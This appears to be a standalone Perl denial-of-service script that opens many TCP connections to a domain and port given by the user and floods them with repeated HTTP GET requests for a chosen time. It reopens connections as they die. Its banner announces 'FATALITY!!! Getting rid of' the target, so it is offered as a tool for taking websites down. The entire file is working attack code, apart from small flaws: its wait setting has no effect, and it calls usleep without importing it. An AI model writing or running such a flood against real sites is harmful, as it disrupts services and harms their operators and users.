#!/usr/bin/perl

use warnings;
use strict;
use Socket;

sub build {
    my ($iaddr, $port, $num) = @_;
    my @sockets;
    my $paddr = sockaddr_in($port, $iaddr);

    for my $i (1 .. $num) {
        my $socket;

        if (!socket($socket, AF_INET, SOCK_STREAM, 6)) {
            next;
        }

        if (!connect($socket, $paddr)) {
            close($socket);
            next;
        }
        push @sockets, $socket;
    }
    return \@sockets;
}

if (@ARGV != 5) {
    die "\r\n\tUsage: perl $0 <domain> <port> <sockets> <wait-ms|0=disable> <time>\r\n\r\n";
}

$SIG{PIPE} = 'IGNORE';

my ($domain,$port,$num,$wait,$time) = @ARGV;

my $iaddr = inet_aton("$domain")
    or die "\r\n\tResolution error.\r\n";

if ($port != 0) {
    $port = 80 if $port < 1 || $port > 65535;
}

if ($wait != 0) {
    my $wait = ($wait * 1000);
}

$time = 30 if $time < 5 || $time > 3600;

print "\r\n" x 20;

print <<'EOF';
 $$$$$$$$$$$$$$$$""$o$o$o$o$o$oo$$""$$$$$$$$$$$$$$$
 $$$$$$$$$$$$""o$$$$$$$$$$"$"$$$$$$$o$"$$$$$$$$$$$$
 $$$$$$$$$"$o$$$$""$oo $ ""      """$$$oo"$$$$$$$$$
 $$$$$$$"o$$$$"   ""o  $oo o o       ""$$$o"$$$$$$$
 $$$$$"o$$$"       oo$$$$$$$$$$o        "$$$o"$$$$$
 $$$$"o$$$  $  o$$$$$$$$$$$$$$"$$oo       "$$$ $$$$
 $$$"$$$"   "$$$$$$$$$$$$$$$$o$o$$$"        $$$o$$$
 $$ $$$    o$$$$$$$$$$$$$$$$$$$$$$$$o o   o  "$$o"$
 $"$$$"    o$$$$$$$$$"$$$$$$"" "$$$$$$"$$$$$  $$$"$
 $o$$"    o$$$$$$$$$$o""$$$""""ooo"$$$$$$$$"   $$$"
 $o$$"    o$$$$$$$$$$            ""oo"$"$o""   $$$o
 o$$$     o$$$$$$$$$$                """""$    o$$o
 o$$$    o$$$$$$$$$$$$o                   "o "oo$$o
 o$$$  oo$$$$$$$$$$$$$$$$ooooooo$$$$$oo    $"$ "$$o
 o$$$"  ""  $$$$$$$$$$$$$$$$$$$$$$$$$$$$o    " $$$
 $ $$$       "$$$$$$$$$$$$$$$$$$$$$$$$$$$o    o$$"$
 $$"$$o       "$$$$$$$$$$$$$$$$$$$$$$$$$$$o   $$$o$
 $$o$$$o       $$""$$$$$$$$$$$$$$$$$$$$$$$o  $$$ $$
 $$$o"$$o    "$""  "$""$$$$$$$$$$$$$$$$$$$oo$$$"$$$
 $$$$o"$$$o        "     $$$$$$$$$$$$$$$$$o$$"o$$$$
 $$$$$$o"$$$o         oo$$$$$$$$$$$$$$$$$$$$"o$$$$$
 $$$$$$$$o"$$$$ooooo$$$$$$$$$$$$$$$$$$$$$$"o$$$$$$$
 $$$$$$$$$$o""$$$$$$$$$$$$$$$$$$$$$$$$$"oo$$$$$$$$$
 $$$$$$$$$$$$$o$""$$$$$$$$$$$$$$$$$""oo$$$$$$$$$$$$
 $$$$$$$$$$$$$$$$$$o$o$"$"$"$"$oo$o$$$$$$$$$$$$$$$$
EOF

print "\r\nFATALITY!!! Getting rid of " . $domain . " for " . $time . " seconds. CTRL+C to abort...\r\n";

my $request = "GET / HTTP/1.1\r\nHost: $domain\r\nUser-agent: Mozilla/5.0\r\nCache-Control: no-cache\r\n\r\n";

my $sockets = build($iaddr, $port, $num);

my $quit = time() + $time;

for (; time() <= $quit ;) {
    my @alive;

    for my $socket (@$sockets) {
        my $sent = send($socket, $request, 0);

        if (!defined($sent) || $sent < length($request)) {
            close($socket);
            next;
        }

        my $buffer;
        while (recv($socket, $buffer, 4096, 0)) {
            last if length($buffer) == 0;
        }

        push @alive, $socket;
    }

    my $alive_count = scalar(@alive);

    if ($alive_count < $num) {
        my $regen = $num - $alive_count;
        
        my $pool = build($iaddr, $port, $regen);
        
        push @alive, @$pool;
    }
    @$sockets = @alive;

    if ($wait != 0) {
        usleep($wait);
    }
}

print "\r\nDone.\r\n\r\n";
exit(0);
